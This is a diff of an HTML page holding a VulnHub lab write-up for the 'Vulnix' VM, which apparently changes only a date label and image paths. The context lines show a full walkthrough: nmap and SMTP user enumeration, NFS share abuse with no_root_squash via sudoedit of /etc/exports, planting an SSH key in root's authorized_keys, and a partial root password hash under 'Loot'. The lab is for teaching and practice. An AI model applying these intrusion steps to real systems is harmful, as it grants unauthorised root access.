@@ -29,10 +29,10 @@
     </div>
     <div class="body">
           <h1>[VulnHub] HackLAB: Vulnix</h1>
-                  <p><a href="/posts/20190919_vulnhub-sedna.html"> « </a>📅 last updated on <code>20/Sep/2019</code></p>
+                  <p><a href="/posts/20190919_vulnhub-sedna.html"> « </a>📅 published on <code>20/Sep/2019</code></p>
                 <h2>Overview</h2>
 <p>This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/hacklab-vulnix,48/">HackLAB: Vulnix</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:  </p>
-<p><img alt="writeup.overview.killchain" src="/static/files/post_vulnhub_vulnix/killchain.png" /></p>
+<p><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_vulnix/killchain.png" /></p>
 <h2>Phase #1: Enumeration</h2>
 <p>1. Here's the Nmap scan result:  </p>
 <pre><code># Nmap 7.70 scan initiated Thu Sep 19 17:29:26 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.vulnix/results/192.168.92.177/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.vulnix/results/192.168.92.177/scans/xml/_quick_tcp_nmap.xml 192.168.92.177
@@ -331,7 +331,7 @@ smtp-user-enum -M VRFY -u user -t 192.168.92.177 -p 25 2&gt;&amp;1
   Hydra (http://www.thc.org/thc-hydra) finished at 2019-09-20 14:09:45
 </code></pre>
 
-<p><img alt="writeup.enumeration.steps.4.1" src="/static/files/post_vulnhub_vulnix/screenshot01.png" />  </p>
+<p><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_vulnix/screenshot01.png" />  </p>
 <h3>Findings</h3>
 <h4>Open Ports:</h4>
 <pre><code>22/tcp     |  ssh       |  OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
@@ -378,9 +378,9 @@ exit
 ssh vulnix@192.168.92.177
 </code></pre>
 
-<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/post_vulnhub_vulnix/screenshot03.png" />  </p>
-<p><img alt="writeup.exploitation.steps.2.2" src="/static/files/post_vulnhub_vulnix/screenshot04.png" />  </p>
-<p><img alt="writeup.exploitation.steps.2.3" src="/static/files/post_vulnhub_vulnix/screenshot05.png" />  </p>
+<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_vulnix/screenshot03.png" />  </p>
+<p><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_vulnhub_vulnix/screenshot04.png" />  </p>
+<p><img alt="writeup.exploitation.steps.2.3" src="/static/files/posts_vulnhub_vulnix/screenshot05.png" />  </p>
 <h2>Phase #2.5: Post Exploitation</h2>
 <pre><code>vulnix@vulnix&gt; id
 uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
@@ -411,18 +411,18 @@ vulnix
 cat /etc/exports
 </code></pre>
 
-<p><img alt="writeup.privesc.steps.1.1" src="/static/files/post_vulnhub_vulnix/screenshot06.png" />  </p>
+<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_vulnix/screenshot06.png" />  </p>
 <p>2. This means we can create a new share and mount it with <code>no_root_squash</code> option:  </p>
 <pre><code>sudoedit /etc/exports
 cat /etc/exports
 </code></pre>
 
-<p><img alt="writeup.privesc.steps.2.1" src="/static/files/post_vulnhub_vulnix/screenshot07.png" />  </p>
+<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_vulnix/screenshot07.png" />  </p>
 <p>3. We have to reboot the target for the <code>/etc/exports</code> changes to take affect:  </p>
 <pre><code>showmount -e 192.168.92.177
 </code></pre>
 
-<p><img alt="writeup.privesc.steps.3.1" src="/static/files/post_vulnhub_vulnix/screenshot08.png" />  </p>
+<p><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_vulnix/screenshot08.png" />  </p>
 <p>4. We can now repeat the exploitation steps but this time for user <code>root</code> and enable remote SSH access:  </p>
 <pre><code>mount 192.168.92.177:/ ./mnt -o vers=3
 cd ./mnt
@@ -432,14 +432,14 @@ cp ~/.ssh/id_rsa.pub ./.ssh/authorized_keys
 ssh root@192.168.92.177
 </code></pre>
 
-<p><img alt="writeup.privesc.steps.4.1" src="/static/files/post_vulnhub_vulnix/screenshot09.png" />  </p>
-<p><img alt="writeup.privesc.steps.4.2" src="/static/files/post_vulnhub_vulnix/screenshot10.png" />  </p>
-<p><img alt="writeup.privesc.steps.4.3" src="/static/files/post_vulnhub_vulnix/screenshot11.png" />  </p>
+<p><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_vulnhub_vulnix/screenshot09.png" />  </p>
+<p><img alt="writeup.privesc.steps.4.2" src="/static/files/posts_vulnhub_vulnix/screenshot10.png" />  </p>
+<p><img alt="writeup.privesc.steps.4.3" src="/static/files/posts_vulnhub_vulnix/screenshot11.png" />  </p>
 <p>5. We can now access the flag to complete the challenge:  </p>
 <pre><code>cat /root/trophy.txt
 </code></pre>
 
-<p><img alt="writeup.privesc.steps.5.1" src="/static/files/post_vulnhub_vulnix/screenshot12.png" />  </p>
+<p><img alt="writeup.privesc.steps.5.1" src="/static/files/posts_vulnhub_vulnix/screenshot12.png" />  </p>
 <h2>Loot</h2>
 <h3>Hashes</h3>
 <pre><code>root:$6$GpmQGQUN$8kLewzMF4ItmxezcryWqSPrXNRTH5TOQFKKkHjK2NSmrTg95xiYi.l8L.RYUL.8pAsj8s4EGvDy4dvENQ........................
